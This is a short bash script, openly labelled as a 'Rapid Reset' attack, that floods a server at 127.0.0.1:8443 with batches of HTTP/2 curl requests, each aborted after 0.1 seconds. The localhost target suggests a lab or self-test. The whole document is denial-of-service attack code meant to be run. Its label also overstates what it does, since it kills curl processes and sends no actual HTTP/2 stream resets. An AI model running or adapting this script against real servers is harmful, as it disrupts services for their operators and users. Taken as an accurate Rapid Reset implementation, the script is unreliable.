#!/bin/bash

echo "Starting Simple Rapid Reset Attack"
echo "Target: https://127.0.0.1:8443"
echo "Starting at: $(date)"

# Function to send rapid requests
rapid_requests() {
    local batch_num=$1
    echo "Batch $batch_num starting..."
    
    for i in {1..20}; do
        # Send request and immediately terminate
        timeout 0.1 curl -k --http2 -s "https://127.0.0.1:8443/api/data" > /dev/null 2>&1 &
    done
    
    wait
    echo "Batch $batch_num completed"
}

# Run multiple batches
for batch in {1..10}; do
    rapid_requests $batch
    sleep 0.5
done

echo "Attack completed at: $(date)"
